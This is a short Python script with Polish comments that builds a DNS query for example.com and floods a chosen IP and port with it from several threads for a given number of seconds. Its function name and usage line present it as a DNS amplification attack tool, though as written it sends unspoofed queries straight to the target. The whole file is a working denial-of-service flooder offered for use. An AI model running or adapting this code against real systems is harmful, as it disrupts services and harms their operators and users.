import sys
import time
import socket
import threading

def create_dns_request():
    # DNS Header Fields
    transaction_id = b'\xaa\xaa'  # Arbitralnie wybrany identyfikator transakcji
    flags = b'\x01\x00'  # Standardowy zapytanie
    questions = b'\x00\x01'  # Liczba pytań: 1
    answer_rrs = b'\x00\x00'  # Liczba odpowiedzi: 0
    authority_rrs = b'\x00\x00'  # Liczba serwerów autorytatywnych: 0
    additional_rrs = b'\x00\x00'  # Liczba dodatkowych rekordów: 0

    # DNS Query
    query_name = b'\x07example\x03com\x00'  # Zapytanie o example.com
    query_type = b'\x00\x01'  # Typ zapytania: A (host address)
    query_class = b'\x00\x01'  # Klasa zapytania: IN (internet)

    dns_request = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query_name + query_type + query_class
    return dns_request

def send_dns_request(target_ip, port, dns_request, end_time):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        while time.time() < end_time:
            sock.sendto(dns_request, (target_ip, port))

def send_dns_amp_requests(target_ip, duration, port, thread_count=5):
    dns_request = create_dns_request()
    end_time = time.time() + duration

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_dns_request, args=(target_ip, port, dns_request, end_time))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"Finished sending DNS requests for {duration} seconds on {thread_count} threads")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python dns.py <ip> <time> <port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    duration = int(sys.argv[2])
    port = int(sys.argv[3])
    
    send_dns_amp_requests(target_ip, duration, port)
